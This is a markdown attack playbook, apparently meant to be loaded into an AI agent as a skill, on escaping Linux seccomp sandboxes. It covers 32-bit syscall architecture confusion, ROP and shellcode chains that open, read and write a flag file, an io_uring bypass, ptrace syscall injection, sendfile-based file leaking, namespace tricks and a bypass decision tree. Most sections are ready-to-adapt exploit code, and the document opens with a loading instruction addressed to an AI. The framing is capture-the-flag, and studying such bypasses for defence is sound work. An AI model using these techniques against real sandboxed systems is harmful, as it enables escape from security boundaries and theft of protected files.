# Seccomp Bypass — Architecture Confusion, io_uring, Allowed Syscall Chaining

> **AI LOAD INSTRUCTION**: Load this for seccomp filter bypass techniques. Covers architecture confusion (x86_64/x86 syscall number mismatch), io_uring bypass, ptrace-based bypass, allowed syscall chaining for ORW, namespace escape, and return value manipulation. Assumes [SKILL.md](./SKILL.md) is loaded for sandbox type identification.

---

## 1. SECCOMP FUNDAMENTALS

### Seccomp Modes

| Mode | Set Via | Behavior |
|---|---|---|
| Strict mode | `prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT)` | Only `read`, `write`, `exit`, `sigreturn` allowed |
| Filter mode (BPF) | `prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, prog)` | Custom BPF program decides per syscall |

### BPF Filter Structure

```c
struct seccomp_data {
    int nr;           // syscall number
    __u32 arch;       // AUDIT_ARCH_X86_64, AUDIT_ARCH_I386, etc.
    __u64 instruction_pointer;
    __u64 args[6];    // syscall arguments
};
```

### Reading seccomp Rules

```bash
# Dump seccomp filter from binary
seccomp-tools dump ./binary

# Output example:
# line  CODE  JT JF K
# 0000: 0x20 00 00 00000004   A = arch
# 0001: 0x15 00 05 c000003e   if (A != ARCH_X86_64) goto 0007
# 0002: 0x20 00 00 00000000   A = sys_number
# 0003: 0x15 03 00 0000003b   if (A == execve) goto 0007  (KILL)
# 0004: 0x15 02 00 00000142   if (A == execveat) goto 0007 (KILL)
# 0005: 0x06 00 00 7fff0000   return ALLOW
```

---

## 2. ARCHITECTURE CONFUSION

**x86_64 processes can invoke x86 (32-bit) syscalls using `int 0x80`.** Syscall numbers differ between architectures.

### Attack Scenario

```
seccomp filter:
  if arch != AUDIT_ARCH_X86_64 → KILL  (blocks 32-bit)
  if nr == 59 (execve) → KILL
  else → ALLOW

Bypass: The filter checks arch correctly. NOT vulnerable to simple confusion.

Vulnerable filter:
  if nr == 59 (execve) → KILL      ← only checks x86_64 syscall numbers
  else → ALLOW
  (no arch check!)

Bypass:
  Use int 0x80 with 32-bit syscall number for execve (11, not 59)
  Filter sees nr=11, doesn't match 59 → ALLOW → execve executes!
```

### x86 vs x86_64 Syscall Number Table (Key Differences)

| Syscall | x86_64 nr | x86 (32-bit) nr |
|---|---|---|
| read | 0 | 3 |
| write | 1 | 4 |
| open | 2 | 5 |
| execve | 59 | 11 |
| mmap | 9 | 90 (old) / 192 (mmap2) |
| mprotect | 10 | 125 |

### Exploitation Code

```nasm
; 32-bit execve via int 0x80 from 64-bit process
; Note: registers are truncated to 32 bits
mov ebx, binsh_addr_low32    ; arg1: filename (must be in low 4GB)
xor ecx, ecx                 ; arg2: argv = NULL
xor edx, edx                 ; arg3: envp = NULL
mov eax, 11                  ; __NR_execve (32-bit)
int 0x80                     ; invoke 32-bit syscall interface
```

**Constraint**: All addresses must be in the lower 4GB (32-bit addressable). Use `mmap(addr, size, ..., MAP_32BIT, ...)` or ensure data is on stack (which may be below 4GB on some configs).

---

## 3. ORW (OPEN-READ-WRITE) CHAIN

When `execve` is blocked but `open`/`read`/`write` are allowed:

### ROP-based ORW

```python
# Build ROP chain for: open("flag") → read(fd, buf, size) → write(1, buf, size)
rop = b''
# open("flag", O_RDONLY)
rop += p64(pop_rdi) + p64(flag_str_addr)
rop += p64(pop_rsi) + p64(0)           # O_RDONLY
rop += p64(pop_rax) + p64(2)           # SYS_open
rop += p64(syscall_ret)
# read(3, buf, 0x100) — fd=3 (first opened file)
rop += p64(pop_rdi) + p64(3)
rop += p64(pop_rsi) + p64(buf_addr)
rop += p64(pop_rdx) + p64(0x100)
rop += p64(pop_rax) + p64(0)           # SYS_read
rop += p64(syscall_ret)
# write(1, buf, 0x100)
rop += p64(pop_rdi) + p64(1)           # stdout
rop += p64(pop_rsi) + p64(buf_addr)
rop += p64(pop_rdx) + p64(0x100)
rop += p64(pop_rax) + p64(1)           # SYS_write
rop += p64(syscall_ret)
```

### Shellcode-based ORW

```nasm
; open
lea rdi, [rip + flag_path]
xor rsi, rsi
mov rax, 2
syscall
; read
mov rdi, rax          ; fd from open
lea rsi, [rsp - 0x100]
mov rdx, 0x100
xor rax, rax
syscall
; write
mov rdi, 1
mov rdx, rax          ; bytes read
lea rsi, [rsp - 0x100]
mov rax, 1
syscall
flag_path: .ascii "flag\x00"
```

### When open is Blocked but openat Allowed

```python
# SYS_openat(AT_FDCWD, "flag", O_RDONLY)
# AT_FDCWD = -100 (0xffffffffffffff9c)
rop += p64(pop_rdi) + p64(0xffffffffffffff9c)  # AT_FDCWD
rop += p64(pop_rsi) + p64(flag_str_addr)
rop += p64(pop_rdx) + p64(0)
rop += p64(pop_rax) + p64(257)                  # SYS_openat
rop += p64(syscall_ret)
```

---

## 4. io_uring BYPASS

`io_uring` is a Linux async I/O interface (kernel ≥ 5.1). io_uring operations are handled by **kernel worker threads** which may bypass seccomp filters applied to the calling thread.

### Why It Works

- seccomp filters are per-thread
- io_uring submission creates kernel work items processed by kworker
- kworker threads may not inherit the seccomp filter (kernel version dependent)
- Patched in kernel ≥ 5.12 (`IORING_SETUP_R_DISABLED` and seccomp propagation)

### Attack

```c
// Setup io_uring ring
struct io_uring ring;
io_uring_queue_init(8, &ring, 0);

// Submit IORING_OP_OPENAT + IORING_OP_READ + IORING_OP_WRITE
// These operations execute in kernel context, bypassing user seccomp

struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
io_uring_prep_openat(sqe, AT_FDCWD, "/flag", O_RDONLY, 0);
sqe->user_data = 1;
io_uring_submit(&ring);
// ... read completion, submit read, write operations ...
```

**Status**: Fixed in modern kernels. io_uring operations now respect seccomp of the submitting thread.

---

## 5. PTRACE-BASED BYPASS

If `ptrace` syscall is allowed by seccomp:

```c
// Fork child process (if fork allowed)
pid_t pid = fork();
if (pid == 0) {
    // Child: wait for parent to attach
    raise(SIGSTOP);
    execve("/bin/sh", NULL, NULL);  // will be intercepted by parent
} else {
    // Parent: attach to child
    ptrace(PTRACE_ATTACH, pid, NULL, NULL);
    waitpid(pid, NULL, 0);
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    // Child's execve may succeed if child doesn't have seccomp
    // Or: inject syscalls into child via PTRACE_POKETEXT
}
```

### Injection via ptrace

```c
// Write syscall instruction into child's memory
ptrace(PTRACE_POKETEXT, pid, addr, syscall_bytes);
// Set child's registers
struct user_regs_struct regs;
ptrace(PTRACE_GETREGS, pid, NULL, &regs);
regs.rax = 59;  // execve
regs.rdi = binsh_addr;
regs.rsi = 0;
regs.rdx = 0;
regs.rip = addr;
ptrace(PTRACE_SETREGS, pid, NULL, &regs);
ptrace(PTRACE_CONT, pid, NULL, NULL);
```

---

## 6. ALLOWED SYSCALL CHAINING

Build useful primitives from seemingly-harmless allowed syscalls:

| Allowed Syscall | Primitive |
|---|---|
| `mmap` + `mprotect` | Allocate RWX page → write shellcode → jump |
| `mprotect` alone | Make existing page executable |
| `sendfile` | `sendfile(stdout_fd, file_fd, NULL, size)` → exfiltrate file without read() |
| `splice` + `tee` | Move data between fds without read/write |
| `process_vm_readv` | Read another process's memory |
| `prctl(PR_SET_NAME)` | Write 16 bytes to kernel-visible comm field |
| `memfd_create` + `execveat` | Create anonymous file → execute it (if both allowed) |

### sendfile ORW Alternative

```python
# If read/write blocked but sendfile allowed:
# open flag file
rop += pop_rdi + flag_str + pop_rsi + p64(0) + pop_rax + p64(2) + syscall_ret
# sendfile(1, 3, NULL, 0x100)  — out_fd=stdout, in_fd=3
rop += pop_rdi + p64(1) + pop_rsi + p64(3) + pop_rdx + p64(0)
rop += pop_r10 + p64(0x100) + pop_rax + p64(40) + syscall_ret  # SYS_sendfile=40
```

---

## 7. NAMESPACE + SECCOMP INTERACTION

### unshare for Filesystem Access

If `unshare` is allowed:

```c
// Create new mount namespace
unshare(CLONE_NEWNS);
// Mount procfs or other filesystems
mount("proc", "/proc", "proc", 0, NULL);
// Access files via /proc that weren't available before
```

### User Namespace Tricks

```c
// Create user namespace (unprivileged)
unshare(CLONE_NEWUSER);
// Inside: UID 0 (fake root)
// Can mount FUSE, access /proc differently
// Some seccomp filters don't account for namespace changes
```

---

## 8. RETURN VALUE MANIPULATION

### SECCOMP_RET_ERRNO

Some filters return `SECCOMP_RET_ERRNO` instead of `SECCOMP_RET_KILL`. The syscall fails but the process continues.

```c
// If filter returns ERRNO for dangerous calls:
// Process survives → try alternative syscalls
// Example: execve returns EPERM → try execveat instead
// Or: brute-force which syscalls are allowed vs killed vs ERRNO
```

### SECCOMP_RET_TRACE

If filter uses `SECCOMP_RET_TRACE`, a tracer (ptrace parent) can modify syscall number and arguments before execution.

---

## 9. DECISION TREE

```
seccomp filter active
├── Dump rules: seccomp-tools dump ./binary
├── Architecture check present?
│   ├── NO → architecture confusion (use int 0x80 for 32-bit syscalls)
│   └── YES → 32-bit bypass blocked
├── What's blocked?
│   ├── Only execve/execveat → ORW chain (open+read+write or openat+read+write)
│   ├── execve + open → openat? sendfile? io_uring?
│   ├── execve + open + openat → io_uring (if kernel < 5.12)?
│   └── Whitelist mode (only specific allowed)?
│       ├── mmap + mprotect allowed? → shellcode execution
│       ├── sendfile allowed? → file exfiltration without read/write
│       ├── ptrace allowed? → inject syscalls into child
│       └── Check every alternative: splice, tee, process_vm_readv
├── Kernel version?
│   ├── < 5.1 → no io_uring available
│   ├── 5.1–5.11 → io_uring bypass possible
│   └── ≥ 5.12 → io_uring seccomp-aware
├── Can fork/clone?
│   ├── YES + ptrace allowed → inject syscalls into child process
│   └── NO → single-process escape only
└── RET_KILL vs RET_ERRNO?
    ├── RET_KILL → process dies on violation (must avoid blocked calls)
    └── RET_ERRNO → process survives, try alternative syscalls
```
